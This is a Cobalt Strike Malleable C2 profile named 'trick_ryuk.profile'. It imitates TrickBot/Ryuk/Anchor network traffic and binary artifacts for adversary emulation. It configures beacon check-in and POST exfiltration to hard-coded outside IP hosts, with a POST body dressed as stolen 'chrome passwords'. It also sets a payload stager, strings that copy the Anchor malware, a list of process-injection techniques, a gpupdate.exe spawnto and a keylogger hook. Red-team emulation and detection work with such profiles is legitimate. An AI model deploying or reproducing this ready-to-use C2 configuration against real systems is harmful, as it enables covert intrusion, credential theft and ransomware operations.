# trick_ryuk.profile
# For CS 4.2, if not then c2lint will not like it.
# Links:
# - https://us-cert.cisa.gov/sites/default/files/publications/AA20-302A_Ransomware%20_Activity_Targeting_the_Healthcare_and_Public_Health_Sector.pdf
# - https://unit42.paloaltonetworks.com/wireshark-tutorial-examining-trickbot-infections/
# xx0hcd

### Global Options ###
set sample_name "trick_ryuk.profile";
set sleeptime "5000";
set jitter "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
set host_stage "true";

### DNS options ###
set dns_idle "8.8.8.8";
set maxdns "245";
set dns_sleep "0";
set dns_stager_prepend "";
set dns_stager_subhost "";
set dns_max_txt "252";
set dns_ttl "1";

### SMB options ###
set pipename "ntsvcs##";
set pipename_stager "scerpc##";

### TCP options ###
set tcp_port "8000";

### SSH options ###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

### SSL Options ###
# https-certificate {
#     set keystore "";
#     set password "";
# }
#
# https-certificate {
#     set C "US";
#     set CN "whatever.com";
#     set L "California";
#     set O "whatever LLC.";
#     set OU "local.org";
#     set ST "CA";
#     set validity "365";
# }
#
# code-signer {
#     set keystore "your_keystore.jks";
#     set password "your_password";
#     set alias "server";
# }

### HTTP-Config Block ###
# http-config {
#     set headers "Server, Content-Type";
#     header "Content-Type" "text/html;charset=UTF-8";
#     header "Server" "nginx";
#     set trust_x_forwarded_for "false";
# }

### HTTP-GET Block ###
http-get {
    set uri "/dd05ce3a-a9c9-4018-8252-d579eed1e670.zip";
    client {
        header "Accept" "text/html, application/xhtml+xml, */*";
        header "Accept-Language" "en-US";
        header "Host" "23.95.97.59";
        header "Connection" "Keep-Alive";
        metadata {
            base64url;
            prepend "SESSIONID=";
            header "Cookie";
        }
    }
    server {
        header "Server" "Apache";
        header "Upgrade" "h2,h2c";
        header "Connection" "Upgrade, Keep-Alive";
        header "Last-Modified" "Wed, 25 Sep 2019 08:23:20 GMT";
        header "ETag" "\"9d441d3-dda-5935c5d9faea6-gzip\"";
        header "Accept-Ranges" "bytes";
        header "Vary" "Accept-Encoding,User-Agent";
        header "Keep-Alive" "timeout=5";
        output {
            netbios;
            prepend "PK.........080..W.3...1.....InvoiceStatement.lnk.Z_.^G..m.j.....\".....f{...7..464.v7.6M..b.o.m..&.M6.....\"..E..|..P.(R%.J..A.....'..9g...L>....;..;3g........B..1S..3.........V....v.......|.....>";
            append ".....achor_dns.....";
            print;
        }
    }
}

### HTTP-Post Block ###
http-post {
    set uri "/ono19/ADMIN-DESKTOP.AC3B679F4A22738281E6D7B0C5946E42/81/";
    set verb "POST";
    client {
        header "Accept" "*/*";
        header "Content-Type" "multipart/form-data; boundary=-----------KMOGEEQTLQTCQMYE";
        output {
            netbios;
            prepend "-----------KMOGEEQTLQTCQMYE";
            prepend "Content-Disposition: form-data; name=\"data\"";
            prepend "https://nytimes.com/|Admin|";
            append "-----------KMOGEEQTLQTCQMYE";
            append "Content-Disposition: form-data; name=\"source\"";
            append "chrome passwords";
            append "-----------KMOGEEQTLQTCQMYE--";
            print;
        }
        id {
            base64url;
            parameter "id";
        }
    }
    server {
        header "Connection" "close";
        header "Server" "Cowboy";
        header "Content-Type" "text/plain";
        output {
            netbios;
            print;
        }
    }
}

### HTTP-Stager Block ###
http-stager {
    set uri_x86 "/dd05ce3a-a9c9-4018-8252-D579eed1e670.zip";
    set uri_x64 "/Dd05ce3a-a9c9-4018-8252-d579eed1e670.zip";
    client {
        header "Host" "51.254.25.115";
        header "Connection" "Keep-Alive";
    }
    server {
        header "Server" "Apache";
        header "Upgrade" "h2,h2c";
        header "Connection" "Upgrade, Keep-Alive";
        header "Last-Modified" "Wed, 25 Sep 2019 08:23:20 GMT";
        header "ETag" "\"9d441d3-dda-5935c5d9faea6-gzip\"";
        header "Accept-Ranges" "bytes";
        header "Vary" "Accept-Encoding,User-Agent";
        header "Keep-Alive" "timeout=5";
        output {
            print;
        }
    }
}

### Malleable PE/Stage Block ###
stage {
    set checksum "0";
    set compile_time "16 Apr 2020 17:56:00";
    set entry_point "170000";
    set image_size_x86 "383992";
    set image_size_x64 "383992";
    # set name "WWanMM.dll";
    set userwx "false";
    set cleanup "false";
    set sleep_mask "false";
    set stomppe "false";
    set obfuscate "false";
    set rich_header "bd8cf6bfbbaf89f44f2e0189ce41549f4d4c550a712cc5660619e4ac3b4adce9";
    set sleep_mask "false";
    transform-x86 {
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
    }
    transform-x64 {
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
    }
    string ",Control_RunDLL \x00";
    string "start program with cmdline \"%s";
    string "Global\\fde345tyhoVGYHUJKIOuy";
    string "get command: incode %s, cmdid \"%s\", cmd \"%s ";
    string "anchorDNS";
    string "Anchor_x86";
    string "Anchor_x64";
    string "{43 00 4F 00 4E 00 4F 00 55 00 54 00 24 00 00 00}";
    string "{6B 65 72 6E 65 6C 33 32 2E 64 6C 6C 00 00 00 00}";
    string "checkip.amazonaws.com";
    string "wtfismyip.com";
    string "{83 C4 04 3D 80 00 00 00 73 15 8B 04 85 ?? ?? ?? ?? 85 C0 74 0A 8D 4D D8 51 8B CF FF D0 8A D8 84 DB C7 45 A4 0F 00 00 00}";
    string "{48 98 B9 E7 03 00 00 48 3D 80 00 00 00 73 1B 48 8D 15 ?? ?? ?? ?? 48 8B 04 C2 48 85 C0 74 0B 48 8D 55 90 48 8B CE FF D0 8B C8}";
    string ":\\Anchor\\Win32\\Release\\Anchor_";
}

### Process Inject Block ###
process-inject {
    set min_alloc "16700";
    set userwx "false";
    set startrwx "false";
    transform-x86 {}
    transform-x64 {}
    execute {
        CreateThread;
        CreateRemoteThread;
        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";
        SetThreadContext;
        NtQueueApcThread-s;
        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
        RtlCreateUserThread;
    }
}

### Post-Ex Block ###
post-ex {
    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
    set obfuscate "false";
    set smartinject "false";
    set amsi_disable "false";
    set thread_hint "ntdll.dll!RtlUserThreadStart";
    set pipename "DserNamePipe##";
    set keylogger "SetWindowsHookEx";
}
